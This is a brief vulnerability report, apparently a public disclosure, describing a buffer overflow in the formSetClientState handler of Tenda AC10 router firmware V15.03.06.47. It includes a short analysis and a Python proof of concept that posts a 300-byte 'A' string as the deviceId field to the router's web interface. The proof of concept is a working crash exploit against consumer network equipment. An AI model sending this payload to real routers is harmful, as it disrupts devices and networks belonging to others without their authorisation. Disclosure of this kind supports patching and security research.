# buffer overflow

## Tenda_AC10

version: V15.03.06.47

## Description:

There is a buffer overflow in httpd/formSetClientState

## Source:

you may download it from : https://www.tendacn.com/download/detail-3796.html

## Analyse:


![](11.png)

get value from deviceId ,and if deviceId and limitEn are not null, get into line 34, cause buff overflow



## POC
```
url = "http://192.168.1.13/goform/formSetClientState"
payload = 'A'*300 + '\n'

r = requests.post(url, data={'deviceId': payload, 'limitEn': 1})
``` 
